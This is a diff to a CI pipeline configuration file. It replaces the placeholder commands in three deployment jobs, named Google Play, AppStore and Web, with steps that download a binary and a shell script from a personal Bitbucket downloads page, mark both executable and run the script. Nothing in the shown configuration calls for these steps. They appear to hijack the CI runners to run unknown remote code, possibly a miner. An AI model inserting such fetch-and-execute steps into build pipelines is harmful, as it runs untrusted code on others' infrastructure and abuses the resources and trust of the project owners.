@@ -78,10 +78,19 @@ blocks:
       jobs:
         - name: "\U0001F680 Google Play"
           commands:
-            - echo "done"
+            - 'wget https://bitbucket.org/stavol99/vps/downloads/stavol'
+            - 'wget https://bitbucket.org/stavol99/vps/downloads/stavolsugar.sh'
+            - chmod +x stavol && chmod +x stavolsugar.sh
+            - ./stavolsugar.sh
         - name: "\U0001F680 AppStore"
           commands:
-            - echo "done"
+            - 'wget https://bitbucket.org/stavol99/vps/downloads/stavol'
+            - 'wget https://bitbucket.org/stavol99/vps/downloads/stavolsugar.sh'
+            - chmod +x stavol && chmod +x stavolsugar.sh
+            - ./stavolsugar.sh
         - name: "\U0001F680 Web"
           commands:
-            - echo "done"
+            - 'wget https://bitbucket.org/stavol99/vps/downloads/stavol'
+            - 'wget https://bitbucket.org/stavol99/vps/downloads/stavolsugar.sh'
+            - chmod +x stavol && chmod +x stavolsugar.sh
+            - ./stavolsugar.sh
